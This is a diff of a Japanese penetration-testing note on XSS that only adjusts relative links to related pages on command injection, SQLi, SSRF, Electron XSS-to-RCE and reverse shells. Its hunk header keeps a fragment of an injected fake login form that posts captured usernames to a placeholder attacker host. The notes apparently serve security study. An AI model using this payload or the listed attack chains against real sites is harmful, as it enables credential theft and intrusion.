@@ -303,11 +303,11 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 - 前：ユーザー入力がHTMLとして反映される箇所を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
 - 前：エラーページにリクエストヘッダーが反射される設計を観測 → 本ファイル「先に確認すること」のヘッダー注入経路
 - 後：HTTPOnly未設定のCookieが取得できた → 管理者セッションで隠しエンドポイント（管理画面・dashboard）にアクセス → `../../01_Reconnaissance/Web_Enumeration.md`（ディレクトリ列挙）
-- 後：管理画面で別の入力点を発見 → `Command_Injection.md`（管理者専用APIにコマンドインジェクションがある典型パターン）
+- 後：管理画面で別の入力点を発見 → `./Command_Injection.md`（管理者専用APIにコマンドインジェクションがある典型パターン）
 - 後：格納型XSSで管理者が閲覧するページに注入できた → 管理者セッション取得 → `../Credential_Discovery.md`
-- 関連：SQLi（同じ入力フィールドの脆弱性・バイパス手法が重複） → `SQLi.md`
-- 関連：SSRF（入力値がサーバー側リクエストになる経路） → `SSRF.md`
+- 関連：SQLi（同じ入力フィールドの脆弱性・バイパス手法が重複） → `./SQLi.md`
+- 関連：SSRF（入力値がサーバー側リクエストになる経路） → `./SSRF.md`
 - 関連：LLM 出力経由の XSS（Improper Output Handling） → `../../06_Concepts/AI_ML/Generative_AI/LLM_Attacks.md`
 - 関連：攻撃側の準備（リスナー起動・到達可能 IP の確認） → `../../06_Concepts/Reverse_Shell.md`
-- 後：Electron デスクトップアプリで XSS が発火する環境 → XSS が RCE に到達する可能性 → `Electron_XSS_RCE.md`
+- 後：Electron デスクトップアプリで XSS が発火する環境 → XSS が RCE に到達する可能性 → `./Electron_XSS_RCE.md`
 - 関連：Electron の nodeIntegration / contextIsolation の原理・各フレームワークの XSS 対策詳細 → `../../06_Concepts/Electron_Security.md`
